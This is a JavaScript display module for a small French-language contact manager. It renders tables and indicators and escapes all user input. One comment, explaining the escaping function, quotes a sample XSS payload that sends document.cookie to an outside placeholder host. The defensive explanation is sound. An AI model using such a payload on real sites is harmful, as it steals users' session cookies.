/**
 * vue.js — l'affichage. Rien que l'affichage.
 * ---------------------------------------------------------------------------
 * Ce fichier ne contient AUCUNE règle métier : il reçoit des données déjà
 * calculées et les met à l'écran. C'est cette séparation qui permet de tester
 * modele.js, depot.js et statistiques.js sans navigateur.
 *
 * Une seule règle de sécurité, mais elle est absolue :
 * tout ce qui vient de l'utilisateur passe par echapper().
 * ---------------------------------------------------------------------------
 */

(function (racine) {
  'use strict';

  const Modele = racine.Modele;

  /**
   * echapper() — neutralise le HTML d'une chaîne.
   *
   * Sans cette fonction, un contact nommé
   *   <img src=x onerror="fetch('https://ailleurs/'+document.cookie)">
   * exécuterait ce code chez tous ceux qui ouvrent la fiche.
   * C'est la faille XSS, la plus répandue du web.
   *
   * @param {*} valeur
   * @returns {string}
   */
  function echapper(valeur) {
    return String(valeur == null ? '' : valeur)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  /** Les libellés lisibles des statuts. */
  const LIBELLES_STATUT = {
    prospect: 'Prospect',
    client: 'Client',
    inactif: 'Inactif'
  };

  /**
   * ligneContact() — une ligne du tableau.
   * @param {Object} c
   * @returns {string} du HTML
   */
  function ligneContact(c) {
    return '<tr data-id="' + echapper(c.id) + '">'
      + '<td><b>' + echapper(c.nom) + '</b><span class="sous">' + echapper(c.email) + '</span></td>'
      + '<td>' + echapper(c.entreprise || '—') + '</td>'
      + '<td><span class="etiq ' + echapper(c.statut) + '">'
        + echapper(LIBELLES_STATUT[c.statut] || c.statut) + '</span></td>'
      + '<td>' + echapper(c.source) + '</td>'
      + '<td class="num">' + echapper(Modele.formaterMontant(c.montant)) + '</td>'
      + '<td>' + echapper(Modele.formaterDate(c.dateContact)) + '</td>'
      + '<td class="actions">'
        + '<button class="mini" data-action="modifier">Modifier</button>'
        + '<button class="mini danger" data-action="supprimer">Supprimer</button>'
      + '</td></tr>';
  }

  /**
   * tableauContacts() — le tableau complet, ou un message si la liste est vide.
   *
   * L'état vide n'est pas un détail : c'est le premier écran que voit
   * un nouvel utilisateur. Un tableau vide sans explication donne
   * l'impression que l'application est cassée.
   *
   * @param {Array} contacts
   * @returns {string}
   */
  function tableauContacts(contacts) {
    if (!contacts || contacts.length === 0) {
      return '<div class="vide">Aucun contact ne correspond. '
           + 'Modifiez vos filtres, ou ajoutez un premier contact.</div>';
    }

    return '<table class="contacts"><thead><tr>'
      + '<th data-tri="nom">Nom</th>'
      + '<th data-tri="entreprise">Entreprise</th>'
      + '<th data-tri="statut">Statut</th>'
      + '<th data-tri="source">Source</th>'
      + '<th data-tri="montant" class="num">Montant</th>'
      + '<th data-tri="dateContact">Dernier contact</th>'
      + '<th></th></tr></thead><tbody>'
      + contacts.map(ligneContact).join('')
      + '</tbody></table>';
  }

  /**
   * cartesResume() — les cinq indicateurs du haut de page.
   * @param {Object} r  La sortie de Statistiques.resume()
   * @returns {string}
   */
  function cartesResume(r) {
    const cartes = [
      { valeur: r.total, libelle: 'contacts' },
      { valeur: r.parStatut.client, libelle: 'clients' },
      { valeur: r.parStatut.prospect, libelle: 'prospects' },
      { valeur: Modele.formaterMontant(r.chiffreAffaires), libelle: 'chiffre d\'affaires' },
      { valeur: r.tauxConversion + ' %', libelle: 'taux de conversion' }
    ];

    return cartes.map(function (c) {
      return '<div class="kpi"><b>' + echapper(c.valeur) + '</b>'
           + '<span>' + echapper(c.libelle) + '</span></div>';
    }).join('');
  }

  /**
   * tableauSources() — la performance par canal d'acquisition.
   * @param {Array} lignes  La sortie de Statistiques.parSource()
   */
  function tableauSources(lignes) {
    if (!lignes || lignes.length === 0) return '<div class="vide">Aucune donnée.</div>';

    return '<table class="contacts"><thead><tr>'
      + '<th>Source</th><th class="num">Contacts</th><th class="num">Clients</th>'
      + '<th class="num">Conversion</th><th class="num">Chiffre d\'affaires</th>'
      + '</tr></thead><tbody>'
      + lignes.map(function (l) {
          return '<tr><td>' + echapper(l.source) + '</td>'
            + '<td class="num">' + l.contacts + '</td>'
            + '<td class="num">' + l.clients + '</td>'
            + '<td class="num">' + l.tauxConversion + ' %</td>'
            + '<td class="num">' + echapper(Modele.formaterMontant(l.chiffreAffaires)) + '</td></tr>';
        }).join('')
      + '</tbody></table>';
  }

  /**
   * listeDormants() — les contacts à rappeler.
   * @param {Array} contacts
   */
  function listeDormants(contacts) {
    if (!contacts || contacts.length === 0) {
      return '<div class="vide">Personne n\'est en attente. Beau travail.</div>';
    }

    return '<ul class="dormants">' + contacts.map(function (c) {
      return '<li><b>' + echapper(c.nom) + '</b>'
        + (c.entreprise ? ' — ' + echapper(c.entreprise) : '')
        + '<span class="sous">dernier contact le '
        + echapper(Modele.formaterDate(c.dateContact)) + '</span></li>';
    }).join('') + '</ul>';
  }

  /**
   * afficherErreurs() — met en rouge les champs fautifs du formulaire.
   * @param {Object} erreurs  { champ: message }
   */
  function afficherErreurs(erreurs) {
    // On commence par tout nettoyer : sinon une erreur corrigée resterait
    // affichée, et l'utilisateur ne comprendrait plus ce qui bloque.
    document.querySelectorAll('.erreur-champ').forEach(function (e) { e.remove(); });
    document.querySelectorAll('.en-erreur').forEach(function (e) {
      e.classList.remove('en-erreur');
    });

    Object.keys(erreurs || {}).forEach(function (champ) {
      const input = document.getElementById('champ-' + champ);
      if (!input) return;

      input.classList.add('en-erreur');

      const message = document.createElement('div');
      message.className = 'erreur-champ';
      message.textContent = erreurs[champ];
      input.parentNode.appendChild(message);
    });
  }

  const api = {
    echapper: echapper,
    LIBELLES_STATUT: LIBELLES_STATUT,
    ligneContact: ligneContact,
    tableauContacts: tableauContacts,
    cartesResume: cartesResume,
    tableauSources: tableauSources,
    listeDormants: listeDormants,
    afficherErreurs: afficherErreurs
  };

  racine.Vue = api;
  if (typeof module !== 'undefined' && module.exports) module.exports = api;

})(typeof globalThis !== 'undefined' ? globalThis : this);
